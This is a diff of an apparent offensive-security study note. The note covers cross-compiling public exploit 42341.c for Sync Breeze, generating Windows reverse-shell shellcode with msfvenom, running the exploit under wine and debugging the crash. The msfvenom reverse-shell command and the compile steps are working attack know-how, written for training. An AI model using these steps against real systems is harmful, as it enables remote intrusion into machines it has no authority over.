@@ -7,12 +7,12 @@ tags: ["infosec","offsec", "exploit", "C"]
 
 #### compiling c on linux
 
-- $ sudo apt install mingw-w64
-- $ i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe
+    $ sudo apt install mingw-w64
+    i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe
 
 when compiling we may run into missing header information 
 
-- $ i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
+    $ i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
 
 #### ip and port
 
@@ -35,7 +35,7 @@ the target or source ip address and port numbers may be hardcoded
 since this is a static exploit - we will most likely need to regenerate shellcode for our specific use case / target environment
 for example if we want a reverse shell for an x86 platform system with no bad characters we can use
 
-- $ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
+    $ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
 
 #### debugging our exploit
 
@@ -48,7 +48,7 @@ after recompiling our exploit we can open our debugger with the application runn
 
 because we are running an executable we can use wine to run the exploit
 
-- sudo wine syncbreeze_exploit.exe
+    sudo wine syncbreeze_exploit.exe
 
   When we run the exploit we did not hit our breakpoint but instead hit a crash with the value of the EIP register pointing to 0x9010090c
 
